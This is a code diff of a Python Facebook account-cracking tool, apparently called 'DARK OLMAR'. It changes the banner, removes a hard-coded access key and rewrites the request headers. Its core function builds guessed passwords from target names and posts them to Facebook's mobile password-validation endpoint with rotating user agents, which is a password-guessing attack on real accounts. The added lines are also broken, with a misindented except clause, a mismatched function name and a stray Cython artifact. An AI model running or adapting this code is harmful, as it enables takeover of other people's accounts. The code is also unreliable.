@@ -66,19 +66,16 @@ for x in range(10000):
 #menu_apikey()
 os.system('clear')
 logo = ("""
-\033[1;91m
-\033[1;91m██████╗░░█████╗░██████╗░██╗░░██╗
-\033[1;91m██╔══██╗██╔══██╗██╔══██╗██║░██╔╝
-\033[1;91m██║░░██║███████║██████╔╝█████═╝░
-\033[1;91m██║░░██║██╔══██║██╔══██╗██╔═██╗░
-\033[1;91m██████╔╝██║░░██║██║░░██║██║░╚██╗
-\033[1;91m╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╗\033[1;91m
+\033[1;91m██████████████████████████████
+\033[1;91m█▄─▄▄─█▄─▄▄▀█▄─▄█▄─▀█▀─▄█─▄▄─█
+\033[1;91m██─▄▄▄██─▄─▄██─███─█▄█─██─██─█
+\033[1;91m▀▄▄▄▀▀▀▄▄▀▄▄▀▄▄▄▀▄▄▄▀▄▄▄▀▄▄▄▄▀\033[1;91m
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  ┃  FACEBOOK : DARK OLMAR
  ┃  GITHUB : NOT FOUND
- ┃  TYPE OF TOOL : PAID
- ┃  VERSION : 0.1       
- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
+ ┃  VERSION : 0.1         
+  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
+
 def linex():
         print('\033[1;92m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 def clear():
@@ -90,19 +87,6 @@ cps=[]
 pcp=[]
 id=[]
 tokenku=[]
-# LOGIN_KEY
-correct_username = 'darkpogi'
-key = 'true'
-
-while key == 'true':
-    username = input('\33[0;97m[dark]\33[1;96m~~~~~>\33[1;92mPLEASE ENTER KEY\33[1;91m: ')
-
-    if username == correct_username:
-        print('\33[1;37m-----------------------------------------------\33[0;97m[•]\33[1;32m WELCOME TO DARK OLMAR TOOL ')
-        time.sleep(1)
-        # Assuming clear() is a function to clear the screen
-        clear()
-        key = 'false'
 
 def fucked():
 	print(' Server Loadin.......')
@@ -239,23 +223,7 @@ def ffb1(ids,names,passlist):
                 for fikr in passlist:
                         pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                         ua=random.choice(ugen)
-                        headers_freefb = {'authority': 'mbasic.facebook.com',  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"vivo 2019"',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"12.0.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-    'viewport-width': '980',}
+                        head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                         getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
@@ -670,16 +638,10 @@ def apix(ids,passlist):
                                 else:
                                         continue
                         loop+=1
-                except requests.exceptions.ConnectionError:
-                        time.sleep(10)
-                except Exception as e:
-                        pass
-
-
-	Spy()
-	
-
-		
-
-
+                        except:
+                       pass
+                  
+                  
+                  
+spy()
 	
